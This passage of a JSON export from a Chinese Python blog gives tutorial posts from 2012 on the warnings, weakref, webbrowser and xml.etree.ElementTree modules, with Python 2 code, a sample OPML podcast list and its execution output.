warning message, before')\nwarnings.formatwarning = warning_on_one_line #修改显示错误信息的格式\nwarnings.warn('This is a warning message, after')\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\ntest.py:5: UserWarning: Show this message\nwarnings.warn('Show this message')\ntest.py:9: UserWarning: This is a warning!\nwarnings.warn('This is a warning!')\ntest.py:17: UserWarning: This is a warning!\nwarnings.warn('This is a warning!')\nWARNING:root:test.py:32: UserWarning:This is a warning message\nWARNING:root:test.py:37: UserWarning:This is a warning message, before\nWARNING:root:test.py:39: UserWarning:This is a warning message, after</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "20"
    }
  },
  {
    "id": 212,
    "title": "关于weakref研究",
    "category": "python模块研究",
    "tags": [
      "weakref"
    ],
    "url": "/archives/guanyuweakrefyanjiu/",
    "content": "<p>前言：对一个对象的弱引用。相对于通常的引用来说，如果一个对象有一个常规的引用，它是不会被垃圾收集器销毁的，但是如果一个对象只剩下一个弱引用，那么它可能被垃圾收集器收回。weakref就是这样的垃圾收集对象的引用模块</p>\n\n<p><pre class=\"sh_python\">\nimport weakref</p>\n\n<p>class ExpensiveObject(object):\n    def __del__(self):\n        print '(Deleting %s)' % self</p>\n\n<p>obj = ExpensiveObject()\nr = weakref.ref(obj)</p>\n\n<p>print 'obj:', obj\nprint 'ref:', r\nprint 'r():', r()</p>\n\n<p>print 'deleting obj'\ndel obj\nprint 'r():', r()\n</pre></p>\n\n<p>执行：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nobj: &lt;__main__.ExpensiveObject object at 0xb73cfe2c&gt;\nref: &lt;weakref at 0xb73d06e4; to 'ExpensiveObject' at 0xb73cfe2c&gt;\nr(): &lt;__main__.ExpensiveObject object at 0xb73cfe2c&gt;  #一个弱引用\ndeleting obj\n(Deleting &lt;__main__.ExpensiveObject object at 0xb73cfe2c&gt;)\nr(): None   #这个引用删除就没有了\n<pre class=\"sh_python\">\nimport weakref</p>\n\n<p>class ExpensiveObject(object):\n    def __del__(self):\n        print '(Deleting %s)' % self</p>\n\n<p>def callback(reference):  #回调函数\n    print 'callback(', reference, ')'</p>\n\n<p>obj = ExpensiveObject()\nr = weakref.ref(obj, callback) #当弱引用被删除会调用回调函数</p>\n\n<p>print 'obj:', obj\nprint 'ref:', r\nprint 'r():', r()</p>\n\n<p>print 'deleting obj'\ndel obj\nprint 'r():', r()\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nobj: &lt;__main__.ExpensiveObject object at 0xb74c2eec&gt;\nref: &lt;weakref at 0xb74c370c; to 'ExpensiveObject' at 0xb74c2eec&gt;\nr(): &lt;__main__.ExpensiveObject object at 0xb74c2eec&gt;\ndeleting obj\ncallback( &lt;weakref at 0xb74c370c; dead&gt; )\n(Deleting &lt;__main__.ExpensiveObject object at 0xb74c2eec&gt;)\nr(): None</p>\n\n<p><pre class=\"sh_python\">\nimport weakref</p>\n\n<p>class ExpensiveObject(object):\n    def __init__(self, name):\n        self.name = name\n    def __del__(self):\n        print '(Deleting %s)' % self</p>\n\n<p>obj = ExpensiveObject('My Object')\nr = weakref.ref(obj)\np = weakref.proxy(obj) #弱引用代理</p>\n\n<p>print 'via obj:', obj.name\nprint 'via ref:', r().name\nprint 'via proxy:', p.name\ndel obj\nprint 'via proxy:', p.name\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nvia obj: My Object\nvia ref: My Object\nvia proxy: My Object\n(Deleting &lt;__main__.ExpensiveObject object at 0xb72f9eec&gt;)\nvia proxy:\nTraceback (most recent call last):  #<tt>因为引用不存在了，触发ReferenceError</tt>\nFile \"test.py\", line 17, in &lt;module&gt;\nprint 'via proxy:', p.name\nReferenceError: weakly-referenced object no longer exists</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "20"
    }
  },
  {
    "id": 213,
    "title": "关于webbrowser研究",
    "category": "python模块研究",
    "tags": [
      "webbrowser"
    ],
    "url": "/archives/guanyuwebbrowseryanjiu/",
    "content": "<p>前言：利用webbrowser模块可以向用户显示web页面，在一个交互式的浏览程序中, webbrowser模块提供了一些用于打开URL链接的函数. 在系统中安装的浏览器, 通过模块的许多选项可以来获取利用他们. 也可通过环境变量BROWSER来控制.</p>\n\n<p><pre class=\"sh_python\">\nimport webbrowser</p>\n\n<p>webbrowser.open('http://www.dongwm.com') #浏览器中打开一个页面,如果当前已经有一个浏览器窗口, 那么会做为一个新标签打开.\nwebbrowser.open_new('http://www.dongwm.com') #在新窗口中打开页面,\nwebbrowser.open_new_tab('http://www.dongwm.com') #新的标签中打开页面</p>\n\n<p>b = webbrowser.get('lynx') #通过get(),使用特定的浏览器  也可以用BROWSER=lynx python test.py 的方式指定lynx\nb.open('http://www.dongwm.com') #也提供了open()、open_new()和open_new_tab()函数\n</pre></p>\n\n<p>注：可以直接命令行：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python -m webbrowser -n http://www.dongwm.com</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "20"
    }
  },
  {
    "id": 214,
    "title": "关于xml.etree.ElementTree研究(创建篇)",
    "category": "python模块研究",
    "tags": [
      "xml.etree.ElementTree"
    ],
    "url": "/archives/guanyuxml-etree-elementtreeyanjiuchuangjianpian/",
    "content": "<p><pre class=\"sh_python\">\nfrom xml.etree.ElementTree import Element, SubElement, Comment, tostring, ElementTree\n\nfrom xml.dom import minidom\nimport sys\nimport csv\nimport datetime\ntop = Element('top')  #创建一个root节点</p>\n\n<p>comment = Comment('Generated for dongwm')  #设置一个注释信息\ntop.append(comment)  #添加到节点中</p>\n\n<p>child = SubElement(top, 'child')  #船舰一个子节点名字叫'child'  父节点是'top'\nchild.text = 'This child contains text.'  #设置子节点的值</p>\n\n<p>child_with_tail = SubElement(top, 'child_with_tail')\nchild_with_tail.text = 'This child has regular text.'  #设置借点标签间的值\nchild_with_tail.tail = 'And \"tail\" text.' #设置节点标签结束后的值</p>\n\n<p>child_with_entity_ref = SubElement(top, 'child_with_entity_ref')\nchild_with_entity_ref.text = 'This &amp; that'  #这个值会在显示的时候转化成合适的内容\nprint tostring(top)\nElementTree(top).write(sys.stdout)  #将xml数据导入流（这里是sys.stdout）\ndef prettify(elem):\n    rough_string = tostring(elem, 'utf-8') #要转化的xml文件\n    reparsed = minidom.parseString(rough_string) \n    return reparsed.toprettyxml(indent=\"  \") #美化显示xml\nprint prettify(top)\ngenerated_on = str(datetime.datetime.now())\nroot = Element('opml')  #设置root节点opml\nroot.set('version', '1.0')  #设置xml的版本</p>\n\n<p>root.append(Comment('Generated by ElementTree_csv_to_xml.py for dongwm')) #增加注释</p>\n\n<p>head = SubElement(root, 'head') #根节点的head子节点\ntitle = SubElement(head, 'title')\ntitle.text = 'My Podcasts' #tittle子节点的值\ndc = SubElement(head, 'dateCreated')  #head的子节点\ndc.text = generated_on  #上面抓取的时间\ndm = SubElement(head, 'dateModified')\ndm.text = generated_on\nbody = SubElement(root, 'body')\nwith open('podcasts.csv', 'rt') as f:  #这是在解析篇生成的csv文件 \n    current_group = None\n    reader = csv.reader(f) #读取csv文件\n    for row in reader:\n        group_name, podcast_name, xml_url, html_url = row\n        if current_group is None or group_name != current_group.text:\n            current_group = SubElement(body, 'outline', {'text':group_name})\n        podcast = SubElement(current_group, 'outline',\n                             {'text':podcast_name,\n                              'xmlUrl':xml_url,\n                              'htmlUrl':html_url,\n                              })</p>\n\n<p>print prettify(root)\nprint\ntop = Element('top') #重新设置根节点\nchildren = [\n    Element('child', num=str(i))\n    for i in xrange(3)\n    ]\ntop.extend(children)  #设置延长，加上上面的迭代列表的三个子节点\ntop = Element('top')\nparent = SubElement(top, 'parent') #设置根节点的子节点\nchildren = XML('''&lt;root&gt;&lt;child num=\"0\" /&gt;&lt;child num=\"1\" /&gt;&lt;child num=\"2\" /&gt;&lt;/root&gt; ''')  #直接使用xml内容添加\nparent.extend(children)\nprint prettify(top)\ntop = Element('top')\nparent_a = SubElement(top, 'parent', id='A') #设置id不同的2个子节点\nparent_b = SubElement(top, 'parent', id='B')\nchildren = XML('''&lt;root&gt;&lt;child num=\"0\" /&gt;&lt;child num=\"1\" /&gt;&lt;child num=\"2\" /&gt;&lt;/root&gt; ''') \nfor c in children:\n    c.set('id', str(id(c)))  #准备要添加的子节点\nparent_a.extend(children)  #增加字节点\nprint 'A:'\nprint prettify(top)  #含有id为A的子节点\nprint\nparent_b.extend(children)  #继续添加ID为B的字节点 但是A的字节点还在\nprint 'B:'\nprint prettify(top)\nprint\ntop = Element('top')\nchild = SubElement(top, 'child')\nchild.text = 'This child contains text.'\nempty_child = SubElement(top, 'empty_child')\nfor method in [ 'xml', 'html', 'text' ]:\n    print method\n    ElementTree(top).write(sys.stdout, method=method) #xml是默认的method，只有<tt>&lt;empty_child /&gt;</tt>，text包含的text内容，html包含<tt>&lt;empty_child&gt;&lt;/empty_child&gt;</tt>\n    print '\\n'\n</pre></p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "20"
    }
  },
  {
    "id": 215,
    "title": "关于xml.etree.ElementTree研究(解析篇)",
    "category": "python模块研究",
    "tags": [
      "xml.etree.ElementTree"
    ],
    "url": "/archives/guanyuxml-etree-elementtreeyanjiujiexipian/",
    "content": "<p>&nbsp;</p>\n\n<p>前言：xml.etree.ElementTree是xml模块中的一部分，从python2.5开始添加，是一个处理xml的接口模块</p>\n\n<p>这里有一个需要解析的opml文件（<a href=\"http://www.opml.org/\">OPML</a>(Outline Processor Markup Language)是建立在XML基础上的“大纲处理标记语言”，</p>\n\n<p>主要用于描述一份资料的结构。它的优势是订阅集中及分享）：</p>\n\n<p><pre class=\"sh_xml\">\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;  #这个例子是podcasts.opml\n&lt;opml version=\"1.0\"&gt;\n&lt;head&gt;\n\t&lt;title&gt;My Podcasts&lt;/title&gt;\n\t&lt;dateCreated&gt;Sun, 07 Mar 2010 15:53:26 GMT&lt;/dateCreated&gt;\n\t&lt;dateModified&gt;Sun, 07 Mar 2010 15:53:26 GMT&lt;/dateModified&gt;\n&lt;/head&gt;\n&lt;body&gt;\n  &lt;outline text=\"Science and Tech\"&gt;\n    &lt;outline text=\"APM: Future Tense\" type=\"rss\" \n             xmlUrl=\"http://www.publicradio.org/columns/futuretense/podcast.xml\" \n             htmlUrl=\"http://www.publicradio.org/columns/futuretense/\" /&gt;\n\t&lt;outline text=\"Engines Of Our Ingenuity Podcast\" type=\"rss\" \n             xmlUrl=\"http://www.npr.org/rss/podcast.php?id=510030\" \n             htmlUrl=\"http://www.uh.edu/engines/engines.htm\" /&gt;\n\t&lt;outline text=\"Science &amp;#38; the City\" type=\"rss\" \n             xmlUrl=\"http://www.nyas.org/Podcasts/Atom.axd\" \n             htmlUrl=\"http://www.nyas.org/WhatWeDo/SciencetheCity.aspx\" /&gt;\n  &lt;/outline&gt;\n  &lt;outline text=\"Books and Fiction\"&gt;\n\t&lt;outline text=\"Podiobooker\" type=\"rss\" \n             xmlUrl=\"http://feeds.feedburner.com/podiobooks\" \n             htmlUrl=\"http://www.podiobooks.com/blog\" /&gt;\n\t&lt;outline text=\"The Drabblecast\" type=\"rss\" \n             xmlUrl=\"http://web.me.com/normsherman/Site/Podcast/rss.xml\" \n             htmlUrl=\"http://web.me.com/normsherman/Site/Podcast/Podcast.html\" /&gt;\n\t&lt;outline text=\"tor.com / category / tordotstories\" type=\"rss\" \n             xmlUrl=\"http://www.tor.com/rss/category/TorDotStories\" \n             htmlUrl=\"http://www.tor.com/\" /&gt;\n  &lt;/outline&gt;\n  &lt;outline text=\"Computers and Programming\"&gt;\n\t&lt;outline text=\"MacBreak Weekly\" type=\"rss\" \n             xmlUrl=\"http://leo.am/podcasts/mbw\" \n             htmlUrl=\"http://twit.tv/mbw\" /&gt;\n\t&lt;outline text=\"FLOSS Weekly\" type=\"rss\" \n             xmlUrl=\"http://leo.am/podcasts/floss\" \n             htmlUrl=\"http://twit.tv\" /&gt;\n\t&lt;outline text=\"Core Intuition\" type=\"rss\" \n             xmlUrl=\"http://www.coreint.org/podcast.xml\" \n             htmlUrl=\"http://www.coreint.org/\" /&gt;\n  &lt;/outline&gt;\n  &lt;outline text=\"Python\"&gt;\n    &lt;outline text=\"PyCon Podcast\" type=\"rss\" \n             xmlUrl=\"http://advocacy.python.org/podcasts/pycon.rss\" \n             htmlUrl=\"http://advocacy.python.org/podcasts/\" /&gt;\n\t&lt;outline text=\"A Little Bit of Python\" type=\"rss\" \n             xmlUrl=\"http://advocacy.python.org/podcasts/littlebit.rss\" \n             htmlUrl=\"http://advocacy.python.org/podcasts/\" /&gt;\n\t&lt;outline text=\"Django Dose Everything Feed\" type=\"rss\" \n             xmlUrl=\"http://djangodose.com/everything/feed/\" /&gt;\n  &lt;/outline&gt;\n  &lt;outline text=\"Miscelaneous\"&gt;\n\t&lt;outline text=\"dhellmann's CastSampler Feed\" type=\"rss\" \n             xmlUrl=\"http://www.castsampler.com/cast/feed/rss/dhellmann/\" \n             htmlUrl=\"http://www.castsampler.com/users/dhellmann/\" /&gt;\n  &lt;/outline&gt;\n&lt;/body&gt;\n&lt;/opml&gt;\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p><pre class=\"sh_xml\">\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;  #这个例子是data.xml\n&lt;top&gt;\n  &lt;child&gt;This child contains text.&lt;/child&gt;\n  &lt;child_with_tail&gt;This child has regular text.&lt;/child_with_tail&gt;And \"tail\" text.\n  &lt;with_attributes name=\"value\" foo=\"bar\" /&gt;\n  &lt;entity_expansion attribute=\"This &amp;#38; That\"&gt;That &amp;#38; This&lt;/entity_expansion&gt;\n&lt;/top&gt;\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p><pre class=\"sh_python\">\nfrom xml.etree import ElementTree</p>\n\n<p>with open('podcasts.opml', 'rt') as f:\n    tree = ElementTree.parse(f)  #返回一个ElementTree的对象</p>\n\n<p>print tree</p>\n\n<p>for node in tree.iter():  #遍历解析树\n    print node.tag, node.attrib #标签和值 </p>\n\n<p>for node in tree.iter('outline'): #遍历outline部分\n    name = node.attrib.get('text') \n    url = node.attrib.get('xmlUrl')\n    if name and url:\n        print '  %s :: %s' % (name, url)\n    else:\n        print name</p>\n\n<p>for node in tree.findall('.//outline'): #没有用getiterator()，而是findall出一个列表迭代 outline是node的名字\n    url = node.attrib.get('xmlUrl')\n    if url:\n        print url\nfor node in tree.findall('.//outline/outline'): #寻找2级层次的node 就是node'outline'的子node是'outline'的过滤\n    url = node.attrib.get('xmlUrl')\n    print url\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\n&lt;xml.etree.ElementTree.ElementTree object at 0xb748e58c&gt;\nopml {'version': '1.0'}\nhead {}\ntitle {}\ndateCreated {}\ndateModified {}\nbody {}\noutline {'text': 'Science and Tech'}\noutline {'xmlUrl': 'http://www.publicradio.org/columns/futuretense/podcast.xml', 'text': 'APM: Future Tense', 'type': 'rss', 'htmlUrl': 'http://www.publicradio.org/columns/futuretense/'}\noutline {'xmlUrl': 'http://www.npr.org/rss/podcast.php?id=510030', 'text': 'Engines Of Our Ingenuity Podcast', 'type': 'rss', 'htmlUrl': 'http://www.uh.edu/engines/engines.htm'}\noutline {'xmlUrl': 'http://www.nyas.org/Podcasts/Atom.axd', 'text': 'Science &amp; the City', 'type': 'rss', 'htmlUrl': 'http://www.nyas.org/WhatWeDo/SciencetheCity.aspx'}\noutline {'text': 'Books and Fiction'}\noutline {'xmlUrl': 'http://feeds.feedburner.com/podiobooks', 'text': 'Podiobooker', 'type': 'rss', 'htmlUrl': 'http://www.podiobooks.com/blog'}\noutline {'xmlUrl': 'http://web.me.com/normsherman/Site/Podcast/rss.xml', 'text': 'The Drabblecast', 'type': 'rss', 'htmlUrl': 'http://web.me.com/normsherman/Site/Podcast/Podcast.html'}\noutline {'xmlUrl': 'http://www.tor.com/rss/category/TorDotStories', 'text': 'tor.com / category / tordotstories', 'type': 'rss', 'htmlUrl': 'http://www.tor.com/'}\noutline {'text': 'Computers and Programming'}\noutline {'xmlUrl': 'http://leo.am/podcasts/mbw', 'text': 'MacBreak Weekly', 'type': 'rss', 'htmlUrl': 'http://twit.tv/mbw'}\noutline {'xmlUrl': 'http://leo.am/podcasts/floss', 'text': 'FLOSS Weekly', 'type': 'rss', 'htmlUrl': 'http://twit.tv'}\noutline {'xmlUrl': 'http://www.coreint.org/podcast.xml', 'text': 'Core Intuition', 'type': 'rss', 'htmlUrl': 'http://www.coreint.org/'}\noutline {'text': 'Python'}\noutline {'xmlUrl': 'http://advocacy.python.org/podcasts/pycon.rss', 'text': 'PyCon Podcast', 'type': 'rss', 'htmlUrl': 'http://advocacy.python.org/podcasts/'}\noutline {'xmlUrl': 'http://advocacy.python.org/podcasts/littlebit.rss', 'text': 'A Little Bit of Python', 'type': 'rss', 'htmlUrl': 'http://advocacy.python.org/podcasts/'}\noutline {'xmlUrl': 'http://djangodose.com/everything/feed/', 'text': 'Django Dose Everything Feed', 'type': 'rss'}\noutline {'text': 'Miscelaneous'}\noutline {'xmlUrl': 'http://www.castsampler.com/cast/feed/rss/dhellmann/', 'text': \"dhellmann's CastSampler Feed\", 'type': 'rss', 'htmlUrl': 'http://www.castsampler.com/users/dhellmann/'}\nScience and Tech\nAPM: Future Tense :: http://www.publicradio.org/columns/futuretense/podcast.xml\nEngines Of Our Ingenuity Podcast :: http://www.npr.org/rss/podcast.php?id=510030\nScience &amp; the City :: http://www.nyas.org/Podcasts/Atom.axd\nBooks and Fiction\nPodiobooker :: http://feeds.feedburner.com/podiobooks\nThe Drabblecast :: http://web.me.com/normsherman/Site/Podcast/rss.xml\ntor.com / category / tordotstories :: http://www.tor.com/rss/category/TorDotStories\nComputers and Programming\nMacBreak Weekly :: http://leo.am/podcasts/mbw\nFLOSS Weekly :: http://leo.am/podcasts/floss\nCore Intuition :: http://www.coreint.org/podcast.xml\nPython\nPyCon Podcast :: http://advocacy.python.org/podcasts/pycon.rss\nA Little Bit of Python :: http://advocacy.python.org/podcasts/littlebit.rss\nDjango Dose Everything Feed :: http://djangodose.com/everything/feed/\nMiscelaneous\ndhellmann's CastSampler Feed :: http://www.castsampler.com/cast/feed/rss/dhellmann/\nhttp://www.publicradio.org/columns/futuretense/podcast.xml\nhttp://www.npr.org/rss/podcast.php?id=510030\nhttp://www.nyas.org/Podcasts/Atom.axd\nhttp://feeds.feedburner.com/podiobooks\nhttp://web.me.com/normsherman/Site/Podcast/rss.xml\nhttp://www.tor.com/rss/category/TorDotStories\nhttp://leo.am/podcasts/mbw\nhttp://leo.am/podcasts/floss\nhttp://www.coreint.org/podcast.xml\nhttp://advocacy.python.org/podcasts/pycon.rss\nhttp://advocacy.python.org/podcasts/littlebit.rss\nhttp://djangodose.com/everything/feed/\nhttp://www.castsampler.com/cast/feed/rss/dhellmann/\nhttp://www.publicradio.org/columns/futuretense/podcast.xml\nhttp://www.npr.org/rss/podcast.php?id=510030\nhttp://www.nyas.org/Podcasts/Atom.axd\nhttp://feeds.feedburner.com/podiobooks\nhttp://web.me.com/normsherman/Site/Podcast/rss.xml\nhttp://www.tor.com/rss/category/TorDotStories\nhttp://leo.am/podcasts/mbw\nhttp://leo.am/podcasts/floss\nhttp://www.coreint.org/podcast.xml\nhttp://advocacy.python.org/podcasts/pycon.rss\nhttp://advocacy.python.org/podcasts/littlebit.rss\nhttp://djangodose.com/everything/feed/\nhttp://www.castsampler.com/cast/feed/rss/dhellmann/\n<pre class=\"sh_python\">\nfrom xml.etree import ElementTree</p>\n\n<p>with open('data.xml', 'rt') as f:\n    tree = ElementTree.parse(f)</p>\n\n<p>node = tree.find('./with_attributes') #找到这个节点\nprint node.tag #打印这个节点的值\nfor name, value in sorted(node.attrib.items()): #\n    print '  %-4s = \"%s\"' % (name, value)</p>\n\n<p>for path in [ './child', './child_with_tail' ]:\n    node = tree.find(path)\n    print node.tag\n    print '  child node text:', node.text  #标签中间部分\n    print '  and tail text  :', node.tail  #标签结束后的那部分</p>\n\n<p>node = tree.find('entity_expansion')\nprint node.tag\nprint '  in attribute:', node.attrib['attribute']  #获取这个标签的属性\nprint '  in text     :', node.text #获取这个标签的值\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p>执行结果：</p>\n\n<p>with_attributes\nfoo  = \"bar\"\nname = \"value\"\nchild\nchild node text: This child contains text.\nand tail text  :</p>\n\n<p>child_with_tail\nchild node text: This child has regular text.\nand tail text  : And \"tail\" text.</p>\n\n<p>entity_expansion\nin attribute: This &amp; That  #转换为适当的字符值返回\nin text     : That &amp; This</p>\n\n<p><pre class=\"sh_python\">\nfrom xml.etree.ElementTree import iterparse</p>\n\n<p>depth = 0\nprefix_width = 8\nprefix_dots = '.' * prefix_width\nline_template = '{prefix:&lt;0.{prefix_len}}{event:&lt;8}{suffix:&lt;{suffix_len}} {node.tag:&lt;12} {node_id}'  #模式匹配</p>\n\n<p>for (event, node) in iterparse('podcasts.opml', ['start', 'end', 'start-ns', 'end-ns']): #iterparse返回一个迭代产生的元组\n                                   #包含事件的名称和触发事件的节点，这些事件：包含在参数第二个参数的列表\n    if event == 'end':\n        depth -= 1  #当事件结束深度－1</p>\n\n<p>    prefix_len = depth * 2</p>\n\n<p>    print line_template.format(prefix=prefix_dots,  #解析格式化  前缀使用设定的一定位数的'.'\n                               prefix_len=prefix_len,\n                               suffix='',\n                               suffix_len=(prefix_width - prefix_len),\n                               node=node,\n                               node_id=id(node),\n                               event=event,\n                               )</p>\n\n<p>    if event == 'start':\n        depth += 1\n\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nstart            opml         3074976588\n..start          head         3074976748\n....start        title        3074976908\n....end          title        3074976908\n....start        dateCreated  3074977228\n....end          dateCreated  3074977228\n....start        dateModified 3074977292\n....end          dateModified 3074977292\n..end            head         3074976748\n..start          body         3074977324\n....start        outline      3074977420\n......start      outline      3074977644\n......end        outline      3074977644\n......start      outline      3074977676\n......end        outline      3074977676\n......start      outline      3074990124\n......end        outline      3074990124\n....end          outline      3074977420\n....start        outline      3074990188\n......start      outline      3074990220\n......end        outline      3074990220\n......start      outline      3074990156\n......end        outline      3074990156\n......start      outline      3074990284\n......end        outline      3074990284\n....end          outline      3074990188\n....start        outline      3074990348\n......start      outline      3074990380\n......end        outline      3074990380\n......start      outline      3074990316\n......end        outline      3074990316\n......start      outline      3074990412\n......end        outline      3074990412\n....end          outline      3074990348\n....start        outline      3074990508\n......start      outline      3074990444\n......end        outline      3074990444\n......start      outline      3074990476\n......end        outline      3074990476\n......start      outline      3074990636\n......end        outline      3074990636\n....end          outline      3074990508\n....start        outline      3074990700\n......start      outline      3074990604\n......end        outline      3074990604\n....end          outline      3074990700\n..end            body         3074977324\nend              opml         3074976588</p>\n\n<p><pre class=\"sh_python\">\nimport csv\nfrom xml.etree.ElementTree import iterparse\nimport sys</p>\n\n<p>writer = csv.writer(sys.stdout, quoting=csv.QUOTE_NONNUMERIC)  #将xml解析成csv文件格式</p>\n\n<p>group_name = ''</p>\n\n<p>for (event, node) in iterparse('podcasts.opml', events=['start']):  \n    if node.tag != 'outline':\n        continue\n    if not node.attrib.get('xmlUrl'):\n        group_name = node.attrib['text']\n    else:\n        # Output a podcast entry\n        writer.writerow( (group_name, node.attrib['text'],\n                          node.attrib['xmlUrl'],\n                          node.attrib.get('htmlUrl', ''),\n                          )\n                         )\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\n\"Science and Tech\",\"APM: Future Tense\",\"http://www.publicradio.org/columns/futuretense/podcast.xml\",\"http://www.publicradio.org/columns/futuretense/\"\n\"Science and Tech\",\"Engines Of Our Ingenuity Podcast\",\"http://www.npr.org/rss/podcast.php?id=510030\",\"http://www.uh.edu/engines/engines.htm\"\n\"Science and Tech\",\"Science &amp; the City\",\"http://www.nyas.org/Podcasts/Atom.axd\",\"http://www.nyas.org/WhatWeDo/SciencetheCity.aspx\"\n\"Books and Fiction\",\"Podiobooker\",\"http://feeds.feedburner.com/podiobooks\",\"http://www.podiobooks.com/blog\"\n\"Books and Fiction\",\"The Drabblecast\",\"http://web.me.com/normsherman/Site/Podcast/rss.xml\",\"http://web.me.com/normsherman/Site/Podcast/Podcast.html\"\n\"Books and Fiction\",\"tor.com / category / tordotstories\",\"http://www.tor.com/rss/category/TorDotStories\",\"http://www.tor.com/\"\n\"Computers and Programming\",\"MacBreak Weekly\",\"http://leo.am/podcasts/mbw\",\"http://twit.tv/mbw\"\n\"Computers and Programming\",\"FLOSS Weekly\",\"http://leo.am/podcasts/floss\",\"http://twit.tv\"\n\"Computers and Programming\",\"Core Intuition\",\"http://www.coreint.org/podcast.xml\",\"http://www.coreint.org/\"\n\"Python\",\"PyCon Podcast\",\"http://advocacy.python.org/podcasts/pycon.rss\",\"http://advocacy.python.org/podcasts/\"\n\"Python\",\"A Little Bit of Python\",\"http://advocacy.python.org/podcasts/littlebit.rss\",\"http://advocacy.python.org/podcasts/\"\n\"Python\",\"Django Dose Everything Feed\",\"http://djangodose.com/everything/feed/\",\"\"\n\"Miscelaneous\",\"dhellmann's CastSampler Feed\",\"http://www.castsampler.com/cast/feed/rss/dhellmann/\",\"http://www.castsampler.com/users/dhellmann/\"\n<pre class=\"sh_python\">\nimport csv\nfrom xml.etree.ElementTree import XMLTreeBuilder  #创建一个自定义的xml数建构\nimport sys</p>\n\n<p>class PodcastListToCSV(object):</p>\n\n<p>    def __init__(self, outputFile):\n        self.writer = csv.writer(outputFile, quoting=csv.QUOTE_NONNUMERIC)\n        self.group_name = ''\n        return</p>\n\n<p>    def start(self, tag, attrib):\n        if tag != 'outline':\n            return\n        if not attrib.get('xmlUrl'):\n            self.group_name = attrib['text']\n        else:\n            self.writer.writerow( (self.group_name, attrib['text'],\n                                   attrib['xmlUrl'],\n                                   attrib.get('htmlUrl', ''),\n                                   )\n                                  )</p>\n\n<p>    def end(self, tag):\n        pass  #放弃关闭标签\n    def data(self, data):\n        pass  #放弃node数据\n    def close(self):\n        return #什么都不做</p>\n\n<p>target = PodcastListToCSV(sys.stdout)\nparser = XMLTreeBuilder(target=target)\nwith open('podcasts.opml', 'rt') as f:\n    for line in f:\n        parser.feed(line)\nparser.close()\n</pre>\n执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\n\"Science and Tech\",\"APM: Future Tense\",\"http://www.publicradio.org/columns/futuretense/podcast.xml\",\"http://www.publicradio.org/columns/futuretense/\"\n\"Science and Tech\",\"Engines Of Our Ingenuity Podcast\",\"http://www.npr.org/rss/podcast.php?id=510030\",\"http://www.uh.edu/engines/engines.htm\"\n\"Science and Tech\",\"Science &amp; the City\",\"http://www.nyas.org/Podcasts/Atom.axd\",\"http://www.nyas.org/WhatWeDo/SciencetheCity.aspx\"\n\"Books and Fiction\",\"Podiobooker\",\"http://feeds.feedburner.com/podiobooks\",\"http://www.podiobooks.com/blog\"\n\"Books and Fiction\",\"The Drabblecast\",\"http://web.me.com/normsherman/Site/Podcast/rss.xml\",\"http://web.me.com/normsherman/Site/Podcast/Podcast.html\"\n\"Books and Fiction\",\"tor.com / category / tordotstories\",\"http://www.tor.com/rss/category/TorDotStories\",\"http://www.tor.com/\"\n\"Computers and Programming\",\"MacBreak Weekly\",\"http://leo.am/podcasts/mbw\",\"http://twit.tv/mbw\"\n\"Computers and Programming\",\"FLOSS Weekly\",\"http://leo.am/podcasts/floss\",\"http://twit.tv\"\n\"Computers and Programming\",\"Core Intuition\",\"http://www.coreint.org/podcast.xml\",\"http://www.coreint.org/\"\n\"Python\",\"PyCon Podcast\",\"http://advocacy.python.org/podcasts/pycon.rss\",\"http://advocacy.python.org/podcasts/\"\n\"Python\",\"A Little Bit of Python\",\"http://advocacy.python.org/podcasts/littlebit.rss\",\"http://advocacy.python.org/podcasts/\"\n\"Python\",\"Django Dose Everything Feed\",\"http://djangodose.com/everything/feed/\",\"\"\n\"Miscelaneous\",\"dhellmann's CastSampler Feed\",\"http://www.castsampler.com/cast/feed/rss/dhellmann/\",\"http://www.castsampler.com/users/dhellmann/\"\n<pre class=\"sh_python\">\nfrom xml.etree.ElementTree import XML,XMLID</p>\n\n<p>parsed = XML('''  参数是一段xml文本\n&lt;root&gt;\n  &lt;group&gt;\n    &lt;child id=\"a\"&gt;This is child \"a\".&lt;/child&gt;\n    &lt;child id=\"b\"&gt;This is child \"b\".&lt;/child&gt;\n  &lt;/group&gt;\n  &lt;group&gt;\n    &lt;child id=\"c\"&gt;This is child \"c\".&lt;/child&gt;\n  &lt;/group&gt;\n&lt;/root&gt;\n''')</p>\n\n<p>print 'parsed =', parsed</p>\n\n<p>for elem in parsed:\n    print elem.tag\n    if elem.text is not None and elem.text.strip():\n        print '  text: \"%s\"' % elem.text\n    if elem.tail is not None and elem.tail.strip():\n        print '  tail: \"%s\"' % elem.tail\n    for name, value in sorted(elem.attrib.items()):\n        print '  %-4s = \"%s\"' % (name, value)\n    print\ntree, id_map = XMLID('''  #使用<tt>id</tt>属性分析xml文本\n&lt;root&gt;\n  &lt;group&gt;\n    &lt;child id=\"a\"&gt;This is child \"a\".&lt;/child&gt;\n    &lt;child id=\"b\"&gt;This is child \"b\".&lt;/child&gt;\n  &lt;/group&gt;\n  &lt;group&gt;\n    &lt;child id=\"c\"&gt;This is child \"c\".&lt;/child&gt;\n  